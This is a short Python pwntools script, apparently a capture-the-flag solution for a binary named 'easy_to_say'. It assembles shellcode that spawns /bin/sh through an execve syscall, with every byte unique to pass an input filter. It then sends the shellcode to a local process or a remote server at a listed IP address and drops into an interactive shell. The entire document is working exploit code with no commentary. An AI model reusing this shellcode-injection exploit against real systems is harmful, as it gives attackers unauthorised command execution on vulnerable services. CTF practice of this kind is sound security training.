from pwn import *
import sys, time

context.binary = "./easy_to_say-c7dd6cdf484305f7aaac4fa821796871"

if len(sys.argv) == 1:
    p = process(["./easy_to_say-c7dd6cdf484305f7aaac4fa821796871"])
    log.info("PID : " + str(proc.pidof(p)[0]))
    pause()

else:
    p = remote("52.69.40.204", "8361")

sc = asm('''
        mov rbx, 0x68732f6e69622e
        inc bx
        push rsi
        push rbx
        push rsp
        pop rdi
        add al, 58
        inc al
        syscall
        ''')

print sc.encode("hex")
for i in xrange(1, len(sc)):
    for j in xrange(i):
        if sc[i] == sc[j]:
            print hex(ord(sc[i]))

print "len : ", len(sc)

p.sendline(sc)
p.interactive()
